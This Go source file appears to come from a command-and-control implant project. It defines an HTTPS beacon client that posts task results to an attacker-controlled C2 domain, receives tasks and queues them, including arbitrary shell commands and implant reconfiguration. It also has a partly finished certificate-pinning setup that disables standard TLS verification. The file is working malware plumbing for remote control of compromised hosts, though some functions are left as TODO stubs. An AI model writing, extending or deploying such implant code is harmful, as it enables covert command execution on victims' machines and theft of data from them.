package c2communicator

import (
	"asritha.dev/implant/pkg/task"
	"bytes"
	"crypto/sha256"
	"crypto/tls"
	"crypto/x509"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"net/http"
	"time"
)

type HTTPSC2TaskRequest struct {
	ID       uint                   `json:"id"`
	TaskType string                 `json:"type"`
	Options  map[string]interface{} `json:"options"`
}

type HTTPSC2Communicator struct {
	Client                *http.Client
	C2HTTPSBeaconEndpoint string
	C2Domain              string
}

func NewHTTPS(C2Domain, C2HTTPSBeaconEndpoint string) *HTTPSC2Communicator {
	return &HTTPSC2Communicator{
		Client: &http.Client{
			Timeout: time.Second * 10,
		},
		C2HTTPSBeaconEndpoint: C2HTTPSBeaconEndpoint,
		C2Domain:              C2Domain,
	}
}

// TODO: do for SSL pinning , fix
func NewSecureHTTPSC2Communicator() *HTTPSC2Communicator {
	// Replace with your pinned public key hash
	pinnedKey := "zEqbIbO2UKzMS+r9AsFvmchbzduA0R88nNt4SzVyudg="

	// Create a custom TLS configuration
	tlsConfig := &tls.Config{
		InsecureSkipVerify: true, // Disable default verification
		VerifyPeerCertificate: func(rawCerts [][]byte, verifiedChains [][]*x509.Certificate) error {
			print("Verifying certificate...\n")
			// Extract the public key from the SERVER's certificate
			cert, err := x509.ParseCertificate(rawCerts[0])
			if err != nil {
				return err
			}
			publicKey := cert.PublicKey
			publicKeyBytes, err := x509.MarshalPKIXPublicKey(publicKey)
			if err != nil {
				return err
			}
			hashedPublicKey := sha256.Sum256(publicKeyBytes)
			encodedPublicKey := base64.StdEncoding.EncodeToString(hashedPublicKey[:])

			// Compare the extracted public key with the pinned key
			if encodedPublicKey != pinnedKey {
				return fmt.Errorf("public key mismatch: expected %s, got %s", pinnedKey, encodedPublicKey)
			}
			return nil
		},
	}

	return &HTTPSC2Communicator{
		Client: &http.Client{
			Timeout: time.Second * 10,
			Transport: &http.Transport{
				TLSClientConfig: tlsConfig,
			},
		},
	}
}

type BeaconPayload struct {
	ImplantID uint          `json:"implant-id"`
	Results   []task.Result `json:"results"`
}

// Beacon sends results and returns the next Queue
func (h *HTTPSC2Communicator) Beacon(implantID uint, results []task.Result) (*task.Queue, error) {
	// 1. Marshal results
	payload := BeaconPayload{
		ImplantID: implantID, // TODO: fix so that it uses JWT so its more secure
		Results:   results,
	}
	body, err := json.Marshal(payload)
	if err != nil {
		return nil, fmt.Errorf("marshal results: %w", err)
	}

	// 2. Build request
	uri := "https://" + h.C2Domain + h.C2HTTPSBeaconEndpoint
	req, err := http.NewRequest(http.MethodPost, uri, bytes.NewReader(body))
	if err != nil {
		return nil, fmt.Errorf("create request: %w", err)
	}
	req.Header.Set("Content-Type", "application/json")

	// 3. Do request
	resp, err := h.Client.Do(req)
	if err != nil {
		return nil, fmt.Errorf("POST beacon: %w", err)
	}
	defer resp.Body.Close()

	if resp.StatusCode != http.StatusOK {
		return nil, fmt.Errorf("unexpected status: %s", resp.Status)
	}

	var c2Tasks []HTTPSC2TaskRequest
	if err = json.NewDecoder(resp.Body).Decode(&c2Tasks); err != nil {
		return nil, fmt.Errorf("decode tasks: %w", err)
	}

	// 5. Enqueue tasks
	tq := task.NewQueue()
	for _, t := range c2Tasks {
		switch t.TaskType {
		case "Ping":
			tq.Enqueue(task.NewPing(t.ID))
		case "Command": // TODO: make this ShellCommand for consistent naming?
			// TODO: CHECKOVER
			raw, ok := t.Options["commandWithArgs"]
			if !ok {
				// TODO: should add malformed Task as a result
				// skip malformed task, but log it
				continue
			}
			args, ok := raw.([]interface{})
			if !ok {
				continue
			}
			// convert []interface{} → []string
			cmd := make([]string, len(args))
			for i, v := range args {
				if s, ok := v.(string); ok {
					cmd[i] = s
				}
			}
			tq.Enqueue(task.NewShellCommand(t.ID, cmd))
		case "Configure":
			tq.Enqueue(task.NewConfigureImplantTask(t.ID, t.Options))
		}
	}
	return tq, nil
}

type ConfigureStandIn struct {
	newConfigureValues map[string]interface{}
}

func NewConfigureStandIn(newConfigValues map[string]interface{}) ConfigureStandIn {
	return ConfigureStandIn{
		newConfigureValues: newConfigValues,
	}
}

func (c ConfigureStandIn) Do() task.Result {
	//TODO implement me
	panic("implement me")
}

func (c ConfigureStandIn) GetID() uint {
	//TODO implement me
	panic("implement me")
}
